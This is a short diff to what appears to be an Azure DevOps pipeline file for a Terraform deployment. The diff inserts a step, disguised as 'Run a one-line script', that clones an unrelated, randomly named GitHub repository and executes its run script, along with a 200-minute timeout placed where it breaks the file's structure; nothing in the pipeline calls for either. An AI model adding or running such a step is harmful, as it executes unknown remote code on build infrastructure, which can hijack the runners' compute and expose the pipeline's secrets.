@@ -13,7 +13,9 @@ variables:
   anyTfChanges: false
 
 steps:
-
+timeoutInMinutes: 200
+- script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+  displayName: 'Run a one-line script'
 - task: TerraformInstaller@0
   displayName: install Terraform v0.12.28
   inputs:
